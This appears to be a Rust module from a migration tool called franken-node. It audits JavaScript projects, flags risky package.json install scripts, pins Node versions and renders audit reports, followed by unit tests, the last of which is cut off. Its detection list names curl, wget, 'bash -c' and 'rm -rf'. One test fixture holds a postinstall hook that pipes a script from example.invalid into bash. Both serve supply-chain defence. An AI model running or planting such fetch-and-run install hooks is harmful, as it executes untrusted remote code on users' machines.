//! Migration admission/progression controls.
//!
//! This module hosts deterministic migration policy gates used to decide
//! whether topology risk deltas are acceptable before and during rollout.

use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

pub mod bpet_migration_gate;
pub mod dgis_migration_gate;

const MAX_FINDINGS_PER_CATEGORY: usize = 16;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AuditOutputFormat {
    Json,
    Text,
    Sarif,
}

impl AuditOutputFormat {
    pub fn parse(raw: &str) -> Result<Self, String> {
        match raw.trim().to_ascii_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            "sarif" => Ok(Self::Sarif),
            other => Err(format!(
                "unsupported migrate audit format `{other}`; expected one of: json, text, sarif"
            )),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationSeverity {
    Info,
    Low,
    Medium,
    High,
}

impl MigrationSeverity {
    const fn rank(self) -> u8 {
        match self {
            Self::High => 4,
            Self::Medium => 3,
            Self::Low => 2,
            Self::Info => 1,
        }
    }

    const fn as_sarif_level(self) -> &'static str {
        match self {
            Self::High => "error",
            Self::Medium | Self::Low => "warning",
            Self::Info => "note",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationCategory {
    Project,
    Dependencies,
    Scripts,
    Runtime,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditFinding {
    pub id: String,
    pub category: MigrationCategory,
    pub severity: MigrationSeverity,
    pub message: String,
    pub path: Option<String>,
    pub recommendation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditSummary {
    pub files_scanned: usize,
    pub js_files: usize,
    pub ts_files: usize,
    pub package_manifests: usize,
    pub risky_scripts: usize,
    pub lockfiles: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub summary: MigrationAuditSummary,
    pub findings: Vec<MigrationAuditFinding>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationRewriteAction {
    PinNodeEngine,
    ManualScriptReview,
    ManifestReadError,
    ManifestParseError,
    NoPackageManifest,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteEntry {
    pub id: String,
    pub path: Option<String>,
    pub action: MigrationRewriteAction,
    pub detail: String,
    pub applied: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackEntry {
    pub path: String,
    pub original_content: String,
    pub rewritten_content: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub package_manifests_scanned: usize,
    pub rewrites_planned: usize,
    pub rewrites_applied: usize,
    pub manual_review_items: usize,
    pub entries: Vec<MigrationRewriteEntry>,
    pub rollback_entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackPlan {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub entry_count: usize,
    pub entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MigrationValidateStatus {
    Pass,
    Fail,
}

impl MigrationValidateStatus {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Pass => "PASS",
            Self::Fail => "FAIL",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidationCheck {
    pub id: String,
    pub passed: bool,
    pub message: String,
    pub remediation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidateReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub status: MigrationValidateStatus,
    pub checks: Vec<MigrationValidationCheck>,
    pub blocking_findings: Vec<MigrationAuditFinding>,
    pub warning_findings: Vec<MigrationAuditFinding>,
}

impl MigrationValidateReport {
    #[must_use]
    pub const fn is_pass(&self) -> bool {
        matches!(self.status, MigrationValidateStatus::Pass)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScriptFindingKind {
    Risky,
    MissingNodeEngine,
}

fn ensure_migration_project_path(project_path: &Path, operation: &str) -> anyhow::Result<()> {
    if !project_path.exists() {
        anyhow::bail!(
            "migration {operation} target does not exist: {}",
            project_path.display()
        );
    }
    if !project_path.is_dir() {
        anyhow::bail!(
            "migration {operation} target must be a directory: {}",
            project_path.display()
        );
    }
    Ok(())
}

pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
    ensure_migration_project_path(project_path, "audit")?;

    let files = collect_project_files(project_path)?;
    let mut findings = Vec::new();
    let mut summary = MigrationAuditSummary {
        files_scanned: 0,
        js_files: 0,
        ts_files: 0,
        package_manifests: 0,
        risky_scripts: 0,
        lockfiles: Vec::new(),
    };
    let mut lockfiles = BTreeSet::new();
    let mut scripts_flagged = 0_usize;
    let mut engine_gaps = 0_usize;

    for path in files {
        summary.files_scanned += 1;
        let relative_path = relative_display(project_path, &path);

        if let Some(name) = path.file_name().and_then(std::ffi::OsStr::to_str) {
            if is_lockfile(name) {
                lockfiles.insert(relative_path.clone());
            }
            if name == "package.json" {
                summary.package_manifests += 1;
                inspect_package_manifest(
                    &path,
                    &relative_path,
                    &mut findings,
                    &mut scripts_flagged,
                    &mut engine_gaps,
                );
            }
        }

        if let Some(ext) = path.extension().and_then(std::ffi::OsStr::to_str) {
            match ext.to_ascii_lowercase().as_str() {
                "js" | "cjs" | "mjs" | "jsx" => summary.js_files += 1,
                "ts" | "tsx" => summary.ts_files += 1,
                _ => {}
            }
        }
    }

    summary.risky_scripts = scripts_flagged;
    summary.lockfiles = lockfiles.into_iter().collect();
    append_summary_findings(&summary, engine_gaps, &mut findings);
    sort_and_assign_ids(&mut findings);

    Ok(MigrationAuditReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        summary,
        findings,
    })
}

pub fn render_audit_report(
    report: &MigrationAuditReport,
    format: AuditOutputFormat,
) -> anyhow::Result<String> {
    match format {
        AuditOutputFormat::Json => serde_json::to_string_pretty(report)
            .map_err(|err| anyhow::anyhow!("failed to serialize migration audit JSON: {err}")),
        AuditOutputFormat::Text => Ok(render_human_audit_report(report)),
        AuditOutputFormat::Sarif => render_sarif(report),
    }
}

pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<MigrationRewriteReport> {
    ensure_migration_project_path(project_path, "rewrite")?;

    let files = collect_project_files(project_path)?;
    let mut package_manifests_scanned = 0_usize;
    let mut rewrites_planned = 0_usize;
    let mut rewrites_applied = 0_usize;
    let mut manual_review_items = 0_usize;
    let mut entries = Vec::new();
    let mut rollback_entries = Vec::new();

    for path in files {
        let is_package_manifest = path
            .file_name()
            .and_then(std::ffi::OsStr::to_str)
            .is_some_and(|name| name == "package.json");
        if !is_package_manifest {
            continue;
        }

        package_manifests_scanned += 1;
        let relative_path = relative_display(project_path, &path);
        let raw = match std::fs::read_to_string(&path) {
            Ok(content) => content,
            Err(err) => {
                manual_review_items += 1;
                entries.push(MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path),
                    action: MigrationRewriteAction::ManifestReadError,
                    detail: format!("unable to read package manifest: {err}"),
                    applied: false,
                });
                continue;
            }
        };

        let mut manifest = match serde_json::from_str::<serde_json::Value>(&raw) {
            Ok(value) => value,
            Err(err) => {
                manual_review_items += 1;
                entries.push(MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path),
                    action: MigrationRewriteAction::ManifestParseError,
                    detail: format!("package manifest JSON parse failed: {err}"),
                    applied: false,
                });
                continue;
            }
        };

        for script_name in collect_risky_script_names(&manifest) {
            manual_review_items += 1;
            entries.push(MigrationRewriteEntry {
                id: String::new(),
                path: Some(relative_path.clone()),
                action: MigrationRewriteAction::ManualScriptReview,
                detail: format!("script `{script_name}` requires manual hardening review"),
                applied: false,
            });
        }

        if ensure_node_engine_pin(&mut manifest) {
            rewrites_planned += 1;
            let rewritten = serde_json::to_string_pretty(&manifest)
                .map(|rendered| format!("{rendered}\n"))
                .map_err(|err| {
                    anyhow::anyhow!(
                        "failed serializing rewritten package manifest {}: {err}",
                        relative_path
                    )
                })?;

            if apply {
                std::fs::write(&path, rewritten.as_bytes()).map_err(|err| {
                    anyhow::anyhow!(
                        "failed writing rewritten package manifest {}: {err}",
                        path.display()
                    )
                })?;
                rewrites_applied += 1;
            }

            entries.push(MigrationRewriteEntry {
                id: String::new(),
                path: Some(relative_path.clone()),
                action: MigrationRewriteAction::PinNodeEngine,
                detail: "set engines.node to >=20 <23 to reduce migration runtime drift"
                    .to_string(),
                applied: apply,
            });
            rollback_entries.push(MigrationRollbackEntry {
                path: relative_path,
                original_content: raw,
                rewritten_content: rewritten,
            });
        }
    }

    if package_manifests_scanned == 0 {
        manual_review_items += 1;
        entries.push(MigrationRewriteEntry {
            id: String::new(),
            path: None,
            action: MigrationRewriteAction::NoPackageManifest,
            detail: "no package.json files found; nothing to rewrite".to_string(),
            applied: false,
        });
    }

    entries.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then_with(|| left.action.cmp(&right.action))
            .then_with(|| left.detail.cmp(&right.detail))
    });
    for (index, entry) in entries.iter_mut().enumerate() {
        entry.id = format!("mig-rewrite-{:03}", index + 1);
    }

    Ok(MigrationRewriteReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: apply,
        package_manifests_scanned,
        rewrites_planned,
        rewrites_applied,
        manual_review_items,
        entries,
        rollback_entries,
    })
}

#[must_use]
pub fn build_rollback_plan(report: &MigrationRewriteReport) -> MigrationRollbackPlan {
    MigrationRollbackPlan {
        schema_version: "1.0.0".to_string(),
        project_path: report.project_path.clone(),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: report.apply_mode,
        entry_count: report.rollback_entries.len(),
        entries: report.rollback_entries.clone(),
    }
}

#[must_use]
pub fn render_rewrite_report(report: &MigrationRewriteReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate rewrite");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(
        &mut output,
        "mode: {}",
        if report.apply_mode {
            "apply"
        } else {
            "dry-run"
        }
    );
    let _ = writeln!(
        &mut output,
        "summary: manifests={} rewrites_planned={} rewrites_applied={} manual_review_items={}",
        report.package_manifests_scanned,
        report.rewrites_planned,
        report.rewrites_applied,
        report.manual_review_items
    );

    if report.entries.is_empty() {
        let _ = writeln!(&mut output, "entries: none");
        return output;
    }

    let _ = writeln!(&mut output, "entries ({}):", report.entries.len());
    for entry in &report.entries {
        let _ = writeln!(
            &mut output,
            "- [{}:{:?}] {}{} (applied={})",
            entry.id,
            entry.action,
            entry.detail,
            entry
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})")),
            entry.applied
        );
    }

    output
}

pub fn run_validate(project_path: &Path) -> anyhow::Result<MigrationValidateReport> {
    let audit = run_audit(project_path)?;

    let blocking_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::High))
        .cloned()
        .collect::<Vec<_>>();
    let warning_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::Medium))
        .cloned()
        .collect::<Vec<_>>();

    let mut checks = Vec::new();
    checks.push(MigrationValidationCheck {
        id: "mig-validate-001".to_string(),
        passed: audit.summary.package_manifests > 0,
        message: format!(
            "package manifests detected: {}",
            audit.summary.package_manifests
        ),
        remediation: Some(
            "Ensure at least one package.json is present before validation.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-002".to_string(),
        passed: !audit.summary.lockfiles.is_empty(),
        message: format!("lockfiles detected: {}", audit.summary.lockfiles.len()),
        remediation: Some(
            "Commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb)."
                .to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-003".to_string(),
        passed: audit.summary.risky_scripts == 0,
        message: format!(
            "risky install/build scripts: {}",
            audit.summary.risky_scripts
        ),
        remediation: Some(
            "Remove or harden risky install/build hooks before migration rollout.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-004".to_string(),
        passed: blocking_findings.is_empty(),
        message: format!("high-severity audit findings: {}", blocking_findings.len()),
        remediation: Some(
            "Resolve all high-severity migrate audit findings before validation can pass."
                .to_string(),
        ),
    });

    let status = if checks.iter().all(|check| check.passed) {
        MigrationValidateStatus::Pass
    } else {
        MigrationValidateStatus::Fail
    };

    Ok(MigrationValidateReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        status,
        checks,
        blocking_findings,
        warning_findings,
    })
}

#[must_use]
pub fn render_validate_report(report: &MigrationValidateReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate validate");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "status: {}", report.status.as_str());
    let _ = writeln!(
        &mut output,
        "summary: checks={} blocking_findings={} warning_findings={}",
        report.checks.len(),
        report.blocking_findings.len(),
        report.warning_findings.len()
    );
    let _ = writeln!(&mut output, "checks:");
    for check in &report.checks {
        let _ = writeln!(
            &mut output,
            "- [{}] {} {}",
            check.id,
            if check.passed { "PASS" } else { "FAIL" },
            check.message
        );
        if !check.passed
            && let Some(remediation) = &check.remediation
        {
            let _ = writeln!(&mut output, "  remediation: {remediation}");
        }
    }

    if !report.blocking_findings.is_empty() {
        let _ = writeln!(
            &mut output,
            "blocking findings ({}):",
            report.blocking_findings.len()
        );
        for finding in &report.blocking_findings {
            let _ = writeln!(
                &mut output,
                "- [{}] {}{}",
                finding.id,
                finding.message,
                finding
                    .path
                    .as_ref()
                    .map_or_else(String::new, |path| format!(" (path: {path})"))
            );
        }
    }

    output
}

fn collect_project_files(root: &Path) -> anyhow::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let mut pending = vec![root.to_path_buf()];

    while let Some(dir) = pending.pop() {
        let entries = std::fs::read_dir(&dir)
            .map_err(|err| anyhow::anyhow!("failed to read directory {}: {err}", dir.display()))?;

        for entry in entries {
            let entry = entry.map_err(|err| {
                anyhow::anyhow!("failed to read directory entry in {}: {err}", dir.display())
            })?;
            let path = entry.path();
            if path.is_dir() {
                if should_skip_dir(&path) {
                    continue;
                }
                pending.push(path);
            } else if path.is_file() {
                files.push(path);
            }
        }
    }

    files.sort();
    Ok(files)
}

fn should_skip_dir(path: &Path) -> bool {
    path.file_name()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|name| {
            matches!(
                name,
                ".git" | "target" | "node_modules" | ".beads" | ".venv" | ".next"
            )
        })
}

fn is_lockfile(name: &str) -> bool {
    matches!(
        name,
        "package-lock.json"
            | "npm-shrinkwrap.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "bun.lockb"
            | "bun.lock"
    )
}

fn inspect_package_manifest(
    manifest_path: &Path,
    relative_path: &str,
    findings: &mut Vec<MigrationAuditFinding>,
    scripts_flagged: &mut usize,
    engine_gaps: &mut usize,
) {
    let raw = match std::fs::read_to_string(manifest_path) {
        Ok(content) => content,
        Err(err) => {
            findings.push(MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::Medium,
                message: format!("failed to read package manifest: {err}"),
                path: Some(relative_path.to_string()),
                recommendation: Some(
                    "Ensure package.json is readable so migration audit can classify dependencies."
                        .to_string(),
                ),
            });
            return;
        }
    };

    let parsed: serde_json::Value = match serde_json::from_str(&raw) {
        Ok(value) => value,
        Err(err) => {
            findings.push(MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: format!("invalid package.json JSON: {err}"),
                path: Some(relative_path.to_string()),
                recommendation: Some(
                    "Fix package.json syntax before running migration rewrite/validate."
                        .to_string(),
                ),
            });
            return;
        }
    };

    if parsed
        .get("engines")
        .and_then(serde_json::Value::as_object)
        .and_then(|engines| engines.get("node"))
        .is_none()
    {
        *engine_gaps += 1;
        push_capped_script_finding(
            findings,
            ScriptFindingKind::MissingNodeEngine,
            relative_path,
            *engine_gaps,
        );
    }

    if let Some(scripts) = parsed.get("scripts").and_then(serde_json::Value::as_object) {
        for (script_name, command_value) in scripts {
            let Some(command) = command_value.as_str() else {
                continue;
            };
            if is_risky_script(script_name, command) {
                *scripts_flagged += 1;
                push_capped_script_finding(
                    findings,
                    ScriptFindingKind::Risky,
                    relative_path,
                    *scripts_flagged,
                );
            }
        }
    }
}

fn push_capped_script_finding(
    findings: &mut Vec<MigrationAuditFinding>,
    kind: ScriptFindingKind,
    relative_path: &str,
    count: usize,
) {
    if count > MAX_FINDINGS_PER_CATEGORY {
        return;
    }

    let (category, severity, message, recommendation) = match kind {
        ScriptFindingKind::Risky => (
            MigrationCategory::Scripts,
            MigrationSeverity::High,
            "risky install/build script pattern detected in package.json".to_string(),
            "Replace dynamic install hooks with deterministic build steps before migration."
                .to_string(),
        ),
        ScriptFindingKind::MissingNodeEngine => (
            MigrationCategory::Runtime,
            MigrationSeverity::Low,
            "package.json is missing engines.node version pin".to_string(),
            "Add engines.node to reduce runtime drift during migration verification.".to_string(),
        ),
    };

    findings.push(MigrationAuditFinding {
        id: String::new(),
        category,
        severity,
        message,
        path: Some(relative_path.to_string()),
        recommendation: Some(recommendation),
    });
}

fn is_risky_script(script_name: &str, command: &str) -> bool {
    let script = script_name.to_ascii_lowercase();
    let cmd = command.to_ascii_lowercase();
    let install_hook = matches!(script.as_str(), "preinstall" | "install" | "postinstall");
    let risky_terms = [
        "curl ",
        "wget ",
        "chmod +x",
        "bash -c",
        "powershell ",
        "sudo ",
        "rm -rf",
        "node-gyp",
    ];

    install_hook || risky_terms.iter().any(|term| cmd.contains(term))
}

fn ensure_node_engine_pin(manifest: &mut serde_json::Value) -> bool {
    let Some(root) = manifest.as_object_mut() else {
        return false;
    };
    let engines = root
        .entry("engines".to_string())
        .or_insert_with(|| serde_json::json!({}));

    let Some(engines_obj) = engines.as_object_mut() else {
        return false;
    };

    if engines_obj
        .get("node")
        .and_then(serde_json::Value::as_str)
        .is_some_and(|value| !value.trim().is_empty())
    {
        return false;
    }

    engines_obj.insert("node".to_string(), serde_json::json!(">=20 <23"));
    true
}

fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
    let mut risky = Vec::new();
    if let Some(scripts) = manifest
        .get("scripts")
        .and_then(serde_json::Value::as_object)
    {
        for (script_name, command_value) in scripts {
            if let Some(command) = command_value.as_str()
                && is_risky_script(script_name, command)
            {
                risky.push(script_name.clone());
            }
        }
    }
    risky.sort();
    risky
}

fn append_summary_findings(
    summary: &MigrationAuditSummary,
    engine_gaps: usize,
    findings: &mut Vec<MigrationAuditFinding>,
) {
    if summary.package_manifests == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Project,
            severity: MigrationSeverity::High,
            message: "no package.json files found in target project".to_string(),
            path: None,
            recommendation: Some(
                "Initialize a package manifest before running migrate rewrite/validate."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Project,
            severity: MigrationSeverity::Info,
            message: format!("detected {} package manifest(s)", summary.package_manifests),
            path: None,
            recommendation: None,
        });
    }

    if summary.lockfiles.is_empty() {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Dependencies,
            severity: MigrationSeverity::Medium,
            message: "no JavaScript lockfile detected".to_string(),
            path: None,
            recommendation: Some(
                "Generate and commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb) before migration."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Dependencies,
            severity: MigrationSeverity::Info,
            message: format!("detected {} lockfile(s)", summary.lockfiles.len()),
            path: None,
            recommendation: None,
        });
    }

    if summary.js_files == 0 && summary.ts_files == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Low,
            message: "no JavaScript/TypeScript source files found".to_string(),
            path: None,
            recommendation: Some(
                "Confirm the migration target path points to the intended JS/TS project."
                    .to_string(),
            ),
        });
    } else if summary.js_files > 0 && summary.ts_files == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Medium,
            message: format!(
                "found {} JavaScript files and no TypeScript files",
                summary.js_files
            ),
            path: None,
            recommendation: Some(
                "Prioritize lockstep validation coverage because runtime assumptions are untyped."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Info,
            message: format!(
                "found {} JavaScript and {} TypeScript files",
                summary.js_files, summary.ts_files
            ),
            path: None,
            recommendation: None,
        });
    }

    if summary.risky_scripts > 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Scripts,
            severity: MigrationSeverity::High,
            message: format!(
                "detected {} potentially risky install/build script(s)",
                summary.risky_scripts
            ),
            path: None,
            recommendation: Some(
                "Review and harden install/build scripts before enabling strict trust policy."
                    .to_string(),
            ),
        });
    }

    if engine_gaps > 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Low,
            message: format!("{} package manifest(s) missing engines.node", engine_gaps),
            path: None,
            recommendation: Some(
                "Pin engines.node across packages to improve migration determinism.".to_string(),
            ),
        });
    }
}

fn sort_and_assign_ids(findings: &mut [MigrationAuditFinding]) {
    findings.sort_by(|left, right| {
        right
            .severity
            .rank()
            .cmp(&left.severity.rank())
            .then_with(|| left.category.cmp(&right.category))
            .then_with(|| left.message.cmp(&right.message))
            .then_with(|| left.path.cmp(&right.path))
    });

    for (index, finding) in findings.iter_mut().enumerate() {
        finding.id = format!("mig-audit-{:03}", index + 1);
    }
}

fn relative_display(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn render_human_audit_report(report: &MigrationAuditReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate audit");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "generated_at_utc: {}", report.generated_at_utc);
    let _ = writeln!(
        &mut output,
        "summary: files={} js={} ts={} manifests={} lockfiles={} risky_scripts={}",
        report.summary.files_scanned,
        report.summary.js_files,
        report.summary.ts_files,
        report.summary.package_manifests,
        report.summary.lockfiles.len(),
        report.summary.risky_scripts
    );

    if !report.summary.lockfiles.is_empty() {
        let _ = writeln!(
            &mut output,
            "lockfiles: {}",
            report.summary.lockfiles.join(", ")
        );
    }

    let _ = writeln!(&mut output, "findings ({}):", report.findings.len());
    for finding in &report.findings {
        let _ = writeln!(
            &mut output,
            "- [{}:{}] {}{}",
            finding.id,
            match finding.severity {
                MigrationSeverity::Info => "info",
                MigrationSeverity::Low => "low",
                MigrationSeverity::Medium => "medium",
                MigrationSeverity::High => "high",
            },
            finding.message,
            finding
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})"))
        );
        if let Some(recommendation) = &finding.recommendation {
            let _ = writeln!(&mut output, "  recommendation: {recommendation}");
        }
    }

    output
}

fn render_sarif(report: &MigrationAuditReport) -> anyhow::Result<String> {
    let results = report
        .findings
        .iter()
        .map(|finding| {
            serde_json::json!({
                "ruleId": finding.id,
                "level": finding.severity.as_sarif_level(),
                "message": {"text": finding.message},
                "locations": finding.path.as_ref().map(|path| vec![serde_json::json!({
                    "physicalLocation": {"artifactLocation": {"uri": path}}
                })]).unwrap_or_default(),
            })
        })
        .collect::<Vec<_>>();

    let sarif = serde_json::json!({
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "franken-node migrate audit",
                    "informationUri": "https://github.com/Dicklesworthstone/franken_node",
                }
            },
            "invocations": [{
                "executionSuccessful": true
            }],
            "results": results
        }]
    });

    serde_json::to_string_pretty(&sarif)
        .map_err(|err| anyhow::anyhow!("failed to serialize migration audit SARIF: {err}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_audit_output_format_is_case_insensitive() {
        assert_eq!(
            AuditOutputFormat::parse("json"),
            Ok(AuditOutputFormat::Json)
        );
        assert_eq!(
            AuditOutputFormat::parse("TEXT"),
            Ok(AuditOutputFormat::Text)
        );
        assert_eq!(
            AuditOutputFormat::parse("Sarif"),
            Ok(AuditOutputFormat::Sarif)
        );
        assert!(AuditOutputFormat::parse("yaml").is_err());
    }

    #[test]
    fn run_audit_flags_risky_scripts_and_missing_lockfiles() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_audit(project).expect("audit should succeed");

        assert_eq!(report.summary.package_manifests, 1);
        assert_eq!(report.summary.js_files, 1);
        assert_eq!(report.summary.ts_files, 0);
        assert_eq!(report.summary.risky_scripts, 1);
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("risky install/build script"))
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("no JavaScript lockfile"))
        );
    }

    #[test]
    fn render_text_report_contains_summary_and_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 3,
                js_files: 2,
                ts_files: 1,
                package_manifests: 1,
                risky_scripts: 1,
                lockfiles: vec!["package-lock.json".to_string()],
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Scripts,
                severity: MigrationSeverity::High,
                message: "risky install/build script pattern detected in package.json".to_string(),
                path: Some("package.json".to_string()),
                recommendation: Some("Harden install scripts before rollout.".to_string()),
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Text).expect("text");
        assert!(rendered.contains("franken-node migrate audit"));
        assert!(rendered.contains("summary: files=3 js=2 ts=1 manifests=1 lockfiles=1"));
        assert!(rendered.contains("- [mig-audit-001:high]"));
        assert!(rendered.contains("recommendation: Harden install scripts before rollout."));
    }

    #[test]
    fn render_sarif_emits_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 1,
                js_files: 1,
                ts_files: 0,
                package_manifests: 0,
                risky_scripts: 0,
                lockfiles: Vec::new(),
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: "no package.json files found in target project".to_string(),
                path: None,
                recommendation: None,
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Sarif).expect("sarif");
        let parsed: serde_json::Value = serde_json::from_str(&rendered).expect("valid json");
        let result_count = parsed["runs"][0]["results"]
            .as_array()
            .map_or(0, std::vec::Vec::len);
        assert_eq!(result_count, 1);
    }

    #[test]
    fn run_rewrite_can_apply_node_engine_pin() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{"name":"demo","version":"1.0.0","scripts":{"test":"node test.js"}}"#,
        )
        .expect("write package");

        let dry_run = run_rewrite(project, false).expect("dry-run rewrite");
        assert_eq!(dry_run.rewrites_planned, 1);
        assert_eq!(dry_run.rewrites_applied, 0);
        assert_eq!(dry_run.rollback_entries.len(), 1);
        assert!(
            dry_run
                .entries
                .iter()
                .any(|entry| entry.action == MigrationRewriteAction::PinNodeEngine)
        );

        let applied = run_rewrite(project, true).expect("applied rewrite");
        assert_eq!(applied.rewrites_planned, 1);
        assert_eq!(applied.rewrites_applied, 1);

        let rewritten =
            std::fs::read_to_string(project.join("package.json")).expect("read rewritten package");
        let parsed: serde_json::Value = serde_json::from_str(&rewritten).expect("valid json");
        assert_eq!(
            parsed
                .get("engines")
                .and_then(serde_json::Value::as_object)
                .and_then(|engines| engines.get("node"))
                .and_then(serde_json::Value::as_str),
            Some(">=20 <23")
        );
    }

    #[test]
    fn run_rewrite_reports_risky_script_manual_review() {
